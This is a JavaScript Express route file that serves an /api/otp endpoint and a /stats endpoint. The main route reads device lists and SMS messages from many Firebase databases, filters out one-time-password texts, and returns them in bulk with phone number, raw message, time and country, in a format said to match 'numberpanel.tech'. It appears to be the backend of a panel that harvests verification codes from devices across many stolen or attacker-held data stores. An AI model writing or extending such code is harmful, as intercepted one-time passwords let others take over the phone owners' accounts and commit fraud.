"use strict";

/**
 * OTP API v1 — Array format, no cache, instant live data.
 * Matches numberpanel.tech format: [[service, phone, raw_sms, timestamp, " country"], ...]
 *
 * GET /api/otp          → 50 OTPs (default)
 * GET /api/otp?count=10 → 10 OTPs
 * GET /api/otp?count=0  → ALL OTPs
 */

const { Router } = require("express");
const ConnectionsService = require("../services/connections");
const FirebaseService = require("../services/firebase");
const DeviceService = require("../services/devices");
const OtpExtractor = require("../services/otpExtractor");

const router = Router();

router.get("/", async (req, res, next) => {
  try {
    const countParam = req.query.count;
    let count;
    if (countParam === "0" || countParam === "all") count = 0;
    else if (countParam) count = Math.min(parseInt(countParam) || 50, 500);
    else count = 50;

    const connections = await ConnectionsService.getAllActive();
    if (connections.length === 0) return res.json([]);

    const allOtps = [];

    const results = await Promise.allSettled(
      connections.map(async (conn) => {
        try {
          const [clientsData, messagesRoot] = await Promise.all([
            FirebaseService.read(conn.url, conn.key, "clients").catch(() => null),
            FirebaseService.read(conn.url, conn.key, "messages").catch(() => null),
          ]);

          const devices = DeviceService.parseAll(clientsData);
          const connOtps = [];

          if (messagesRoot && typeof messagesRoot === "object") {
            for (const [deviceId, deviceMessages] of Object.entries(messagesRoot)) {
              if (!deviceMessages || typeof deviceMessages !== "object") continue;

              // Get phone DIRECTLY from normalized device data
              const device = devices.find((d) => d.id === deviceId);
              const phone = (device && device.phoneNumber && device.phoneNumber !== "—")
                ? device.phoneNumber : "";

              for (const [, msg] of Object.entries(deviceMessages)) {
                if (!msg || typeof msg !== "object") continue;
                const text = msg.text || msg.body || msg.message || "";
                if (!OtpExtractor.isOtpMessage(text)) continue;
                const extracted = OtpExtractor.extractOtp(text);
                if (!extracted) continue;

                const ts = getTimestamp(msg);
                const country = OtpExtractor.detectCountry(phone);

                connOtps.push([
                  extracted.service,
                  phone || "Unknown",
                  text.trim(),
                  ts,
                  " " + country,
                ]);
              }
            }
          }
          return connOtps;
        } catch { return []; }
      })
    );

    for (const result of results) {
      if (result.status === "fulfilled") allOtps.push(...result.value);
    }

    allOtps.sort((a, b) => {
      const da = new Date(a[3]).getTime() || 0;
      const db = new Date(b[3]).getTime() || 0;
      return db - da;
    });

    res.json(count > 0 ? allOtps.slice(0, count) : allOtps);
  } catch (err) {
    next(err);
  }
});

router.get("/stats", async (req, res, next) => {
  try {
    const connections = await ConnectionsService.getAllActive();
    res.json({
      activeConnections: connections.length,
      cachedOtps: 0,
      cacheAgeSeconds: 0,
      cacheTtlSeconds: 0,
    });
  } catch (err) { next(err); }
});

function getTimestamp(msg) {
  const raw = msg.timestamp || msg.time || msg.date || msg.receivedAt || msg.createdAt || msg.sentAt || msg.ts || "";
  if (!raw) return formatDate(new Date());
  if (typeof raw === "number") return formatDate(new Date(raw > 1e12 ? raw : raw * 1000));
  const d = new Date(raw);
  if (!isNaN(d.getTime())) return formatDate(d);
  if (typeof raw === "string" && /\d{4}[-/]\d{2}[-/]\d{2}/.test(raw)) return raw.replace(/\//g, "-").slice(0, 19);
  return formatDate(new Date());
}

function formatDate(d) {
  const p = (n) => String(n).padStart(2, "0");
  return `${d.getUTCFullYear()}-${p(d.getUTCMonth()+1)}-${p(d.getUTCDate())} ${p(d.getUTCHours())}:${p(d.getUTCMinutes())}:${p(d.getUTCSeconds())}`;
}

module.exports = router;
